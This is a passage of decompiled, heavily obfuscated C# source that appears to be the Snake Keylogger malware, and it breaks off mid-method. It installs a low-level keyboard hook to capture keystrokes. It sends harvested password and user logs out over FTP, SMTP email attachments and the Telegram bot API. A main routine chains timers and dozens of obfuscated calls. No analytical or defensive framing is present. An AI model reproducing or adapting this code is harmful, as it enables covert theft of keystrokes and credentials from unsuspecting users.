      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - Passwords ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] bytes = Encoding.UTF8.GetBytes(\uFFFDٗ\u05C3\uFFFDc.\uFFFD̔ٷі쐬("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDٗ\u05C3\uFFFDc.ܣ\u02E8㠰\u0089ʭ();
          byte[] buffer2 = \uFFFDٗ\u05C3\uFFFDc.\uFFFD븤Ԝcƚ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = \uFFFDٗ\u05C3\uFFFDc.\uFFFD̔ٷі쐬("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.\u0089ʭ̮\uFFFDЦ("SnakePW" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static byte[] 鈟\uFFFD\uFFFD\u07B4ی() => Encoding.Unicode.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static byte[] ٷʤߟیҏ() => Encoding.Default.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static void \u07B8丐ɩӥ\uFFFD()
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - Passwords ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDٗ\u05C3\uFFFDc.鈟\uFFFD\uFFFD\u07B4ی();
          byte[] buffer2 = \uFFFDٗ\u05C3\uFFFDc.ٷʤߟیҏ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.\u0089ʭ̮\uFFFDЦ("SnakePW" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void JՄ\u02F3\u061D\u00AB(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Name + " - Passwords ID - "), \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱), (object) \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD, \uFFFDٗ\u05C3\uFFFDc.εOչéΩ);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ);
          message.To.Add(\uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDٗ\u05C3\uFFFDc.鈟\uFFFD\uFFFD\u07B4ی();
          byte[] buffer2 = \uFFFDٗ\u05C3\uFFFDc.ٷʤߟیҏ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "text/plain"));
          new SmtpClient(\uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ, \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n" + \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA + "/sendDocument?chat_id=" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDٗ\u05C3\uFFFDc.\u0089ʭ̮\uFFFDЦ("SnakePW" + \uFFFDٗ\u05C3\uFFFDc.اЅ\u058Fʤ콪, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static object ՕʭԌڿ\u005E()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0))));
    }

    public static void 쐬鈇ӥթK()
    {
    }

    public static void \uFFFD\uFFFD\uFFFDJ߂()
    {
    }

    public static void 뫆\uFFFDԜ̧퓜()
    {
    }

    public static void ג\uFFFDǎOב()
    {
    }

    public static void Ԝ\u26CAę\u07FB\u0026()
    {
    }

    public static void 皍\uFFFD̀㠰؜()
    {
    }

    public static void \uFFFDɢşƉב()
    {
    }

    public static void \u07C2\uFFFDɩҚ蠺()
    {
    }

    public static void \u0655ޗęɇֵ()
    {
    }

    public static void Z\uFFFD\u00AB\uFFFDē()
    {
    }

    public static void j\u00BEƉٕŲ()
    {
    }

    public static void \u0327\uFFFD\uFFFDƌƉ()
    {
    }

    public static void \u0026ޤ\uFFFD\uFFFDζ()
    {
    }

    public static void \uFFFDݶ\uFFFDɮՄ()
    {
      try
      {
        \uFFFDٗ\u05C3\uFFFDc.Ų\u061D\uFFFD\uFFFDŲ.Interval = 1;
        \uFFFDٗ\u05C3\uFFFDc.Ų\u061D\uFFFD\uFFFDŲ.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDŁƟٷۚ()
    {
      try
      {
        \uFFFDٗ\u05C3\uFFFDc.\u06E8\uFFFD\uFFFDٵջ();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ĂհcƌՄ()
    {
      try
      {
        \uFFFDٗ\u05C3\uFFFDc.Α\u061Dٷמ\u05C9();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0333\uFFFDᔖ\uFFFDľ()
    {
    }

    public static void 㹃\uFFFDӺʪִ()
    {
    }

    public static void \u0300ήŔ䇹m()
    {
      if (Operators.ConditionalCompareObjectEqual(\uFFFDٗ\u05C3\uFFFDc.\u00BEş\u0385ױņ, (object) "ProtectTrue", false))
      {
        if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4, "", false) == 0)
          return;
        \uFFFDٗ\u05C3\uFFFDc.ǎ\uFFFD꾯Ɯꓞ();
        Thread.Sleep(8000);
        \uFFFDٗ\u05C3\uFFFDc.Օ\uFFFDکŧ\u07B4();
        Thread.Sleep(3000);
        \uFFFDٗ\u05C3\uFFFDc.ʤ\u0609\uFFFD\u002Dܪ();
        Thread.Sleep(3000);
        \uFFFDٗ\u05C3\uFFFDc.\uFFFD똛\uFFFDӥޤ();
        Thread.Sleep(3000);
        \uFFFDٗ\u05C3\uFFFDc.ή\u05C9ʓɢ\u0089();
      }
      else if (Operators.CompareString(\uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4, "", false) != 0)
      {
        \uFFFDٗ\u05C3\uFFFDc.\u07B8丐ɩӥ\uFFFD();
        Thread.Sleep(8000);
        \uFFFDٗ\u05C3\uFFFDc.ų皍ިٷ\u058F();
        Thread.Sleep(3000);
        \uFFFDٗ\u05C3\uFFFDc.ʤ\u0609\uFFFD\u002Dܪ();
        Thread.Sleep(3000);
        \uFFFDٗ\u05C3\uFFFDc.\uFFFD똛\uFFFDӥޤ();
        Thread.Sleep(3000);
        \uFFFDٗ\u05C3\uFFFDc.ή\u05C9ʓɢ\u0089();
      }
    }

    public static void ʤ\u0609\uFFFD\u002Dܪ()
    {
    }

    public static void \uFFFD똛\uFFFDӥޤ()
    {
      try
      {
        \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uDAE4\uDC0B\uFFFDݝ.Start();
        \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uDAE4\uDC0B\uFFFDݝ.Interval = Convert.ToInt32("60000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ή\u05C9ʓɢ\u0089()
    {
      try
      {
        \uFFFDٗ\u05C3\uFFFDc.اި\uFFFDcУ.Start();
        \uFFFDٗ\u05C3\uFFFDc.اި\uFFFDcУ.Interval = Convert.ToInt32("60000");
        \uFFFDٗ\u05C3\uFFFDc.\u07B4Ł\uFFFD㹃㠰();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Օ\uFFFDکŧ\u07B4()
    {
    }

    public static void ų皍ިٷ\u058F()
    {
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        \uFFFDٗ\u05C3\uFFFDc.ג\uFFFDǎOב();
        \uFFFDٗ\u05C3\uFFFDc.쐬鈇ӥթK();
        \uFFFDٗ\u05C3\uFFFDc.뫆\uFFFDԜ̧퓜();
        \uFFFDٗ\u05C3\uFFFDc.Ԝ\u26CAę\u07FB\u0026();
        \uFFFDٗ\u05C3\uFFFDc.皍\uFFFD̀㠰؜();
        \uFFFDٗ\u05C3\uFFFDc.\uFFFDɢşƉב();
        \uFFFDٗ\u05C3\uFFFDc.UǎWtɇ();
        \uFFFDٗ\u05C3\uFFFDc.\u07C2\uFFFDɩҚ蠺();
        \uFFFDٗ\u05C3\uFFFDc.\u0655ޗęɇֵ();
        \uFFFDٗ\u05C3\uFFFDc.Z\uFFFD\u00AB\uFFFDē();
        \uFFFDٗ\u05C3\uFFFDc.j\u00BEƉٕŲ();
        \uFFFDٗ\u05C3\uFFFDc.\u0327\uFFFD\uFFFDƌƉ();
        \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\uFFFDJ߂();
        \uFFFDٗ\u05C3\uFFFDc.\u0026ޤ\uFFFD\uFFFDζ();
        \uFFFDٗ\u05C3\uFFFDc.\uFFFDŁƟٷۚ();
        \uFFFDٗ\u05C3\uFFFDc.ĂհcƌՄ();
        \uFFFDٗ\u05C3\uFFFDc.\u0333\uFFFDᔖ\uFFFDľ();
        뫆Ɯ\uFFFDJ\uFFFD.K뫆̧\uFFFD̳();
        뫆Ɯ\uFFFDJ\uFFFD.jņ\u02F3ë\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.ZR\uFFFDʤ\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.Ɖ쐬\u005Eɢ\u0609();
        뫆Ɯ\uFFFDJ\uFFFD.ݶל䕃\uFFFDҡ();
        뫆Ɯ\uFFFDJ\uFFFD.\u07C2̲ױ쐬\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.ܪ\uD911\uDF63і\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDЅԜЦ2();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFD\uFFFD\uFFFDֵ\u05C3();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDɛ\uFFFD蠺Ϙ();
        뫆Ɯ\uFFFDJ\uFFFD.Ц쐬鈟\u0026\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFD\u002Dę\u0089꾯();
        뫆Ɯ\uFFFDJ\uFFFD.ɮݝ\uFFFD\uFFFD皍();
        뫆Ɯ\uFFFDJ\uFFFD.c\u0089ɛ\uFFFDٗ();
        뫆Ɯ\uFFFDJ\uFFFD.ş\uFFFDε\u058F̱();
        뫆Ɯ\uFFFDJ\uFFFD.\u002Dթεިۣ();
        뫆Ɯ\uFFFDJ\uFFFD.Ī̀Wε䇹();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFD\uFFFDׁڿՕ();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFD\uFFFD\u05C9ܣ\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.t\uDBB0\uDE26ҟֵ();
        뫆Ɯ\uFFFDJ\uFFFD.ϱĂ̳Z();
        뫆Ɯ\uFFFDJ\uFFFD.\u0332ױ\uFFFDکJ();
        뫆Ɯ\uFFFDJ\uFFFD.\u26CA鈇أ泮\u060C();
        뫆Ɯ\uFFFDJ\uFFFD.ȨRϫƜc();
        뫆Ɯ\uFFFDJ\uFFFD.ٷꓞ\u0609Wс();
        뫆Ɯ\uFFFDJ\uFFFD.UۨƟҡ\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.\u032Ȩ\uFFFDԜŚ();
        뫆Ɯ\uFFFDJ\uFFFD.\u07A8ۨӤֵթ();
        뫆Ɯ\uFFFDJ\uFFFD.z\uFFFD\u2964ĪB();
        뫆Ɯ\uFFFDJ\uFFFD.恁Cٕ\uFFFD㠰();
        뫆Ɯ\uFFFDJ\uFFFD.ɇ\u26CA\uFFFDɛO();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDŴ\uFFFD\uFFFD\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.ˤ\uFFFDëœ\u07B4();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDԹ\uFFFDȨ̮();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDϒ\uFFFD\u07BBЅ();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDˤҟޤ\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.ߡ\uFFFD꾯ɮ\u0609();
        뫆Ɯ\uFFFDJ\uFFFD.ҏåȨՕ\u0385();
        뫆Ɯ\uFFFDJ\uFFFD.\u05B5ņ\u0385kӺ();
        뫆Ɯ\uFFFDJ\uFFFD.WϘƚK\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDٵӺ丐\u07BB();
        뫆Ɯ\uFFFDJ\uFFFD.\u060Ct\u058Fӛή();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFDیɮ\u07B9Ś();
        뫆Ɯ\uFFFDJ\uFFFD.\u0331̆\uFFFDޤZ();
        뫆Ɯ\uFFFDJ\uFFFD.\u0609\uDA3B\uDEEAݶا();
        뫆Ɯ\uFFFDJ\uFFFD.Ɯ\uFFFD븤ᔖ\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.Ŗ́Қ\u07BBǎ();
        뫆Ɯ\uFFFDJ\uFFFD.\u065Aިіʤ쐬();
        뫆Ɯ\uFFFDJ\uFFFD.늻ܣƉٗ\uFFFD();
        뫆Ɯ\uFFFDJ\uFFFD.\uFFFD䇹\uFFFDӺݝ();
        뫆Ɯ\uFFFDJ\uFFFD.Թ\uFFFD\uFFFDɢ̆();
        뫆Ɯ\uFFFDJ\uFFFD.ߡ\uFFFD\uFFFDήջ();
        ŁWˤ\uFFFD\uFFFD.\uFFFDݶ늻і\uFFFD();
        ŁWˤ\uFFFD\uFFFD.\uFFFD\uFFFD\u002DZױ();
        ŁWˤ\uFFFD\uFFFD.RŁۨ뫆ҭ();
        ŁWˤ\uFFFD\uFFFD.ƚ\uFFFD\uFFFD\u07FBۣ();
        ŁWˤ\uFFFD\uFFFD.\u05C9ľִأA();
        ŁWˤ\uFFFD\uFFFD.מ꼺\uFFFDՄŎ();
        ŁWˤ\uFFFD\uFFFD.꼺ş߂ų\u0385();
        ŁWˤ\uFFFD\uFFFD.\u05C3ε콪\u060Cܪ();
        ŁWˤ\uFFFD\uFFFD.ٵЅ\uFFFDşҚ();
        ŁWˤ\uFFFD\uFFFD.\u032EΑɛĂœ();
        \uFFFDٗ\u05C3\uFFFDc.㹃\uFFFDӺʪִ();
        \uFFFDٗ\u05C3\uFFFDc.\u0300ήŔ䇹m();
        Application.Run();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public delegate void KeyLoggerEventArgsEventHandler(
      object sender,
      \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgs e);

    public class KeyLoggerEventArgs : EventArgs
    {
      private Keys _keys;
      private string _stringValue;

      public KeyLoggerEventArgs(Keys key, string stringValue)
      {
        this._keys = key;
        this._stringValue = stringValue;
      }

      public Keys Key => this._keys;

      public string StringValue => this._stringValue;
    }

    public class KeyLogger : IDisposable
    {
      private \uFFFDٗ\u05C3\uFFFDc.KeyLogger.KeyboardProc _hookCallback;
      private IntPtr _hook;
      private string _currentWindow;
      private bool _newWindow;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr SetHook(
        int hook,
        \uFFFDٗ\u05C3\uFFFDc.KeyLogger.KeyboardProc KeyDelegate,
        IntPtr HMod,
        int ThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHook(IntPtr hook, int code, int direction, ref Keys key);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnHook(IntPtr hook);

      public event \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgsEventHandler KeyDown;

      public event \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgsEventHandler KeyUp;

      public string CurrentWindow => this._currentWindow;

      public KeyLogger()
      {
        this._hookCallback = new \uFFFDٗ\u05C3\uFFFDc.KeyLogger.KeyboardProc(this.ProcessKey);
        this._hook = \uFFFDٗ\u05C3\uFFFDc.KeyLogger.SetHook(13, this._hookCallback, IntPtr.Zero, 0);
        if (!(this._hook == IntPtr.Zero))
          ;
        this.InitializeCaptionLogging();
      }

      private int ProcessKey(int code, int direction, ref Keys key)
      {
        if (code == 0)
        {
          if (direction == 256)
          {
            // ISSUE: reference to a compiler-generated field
            \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgsEventHandler keyDownEvent = this.KeyDownEvent;
            if (keyDownEvent != null)
              keyDownEvent((object) this, new \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
          else if (direction == 260)
          {
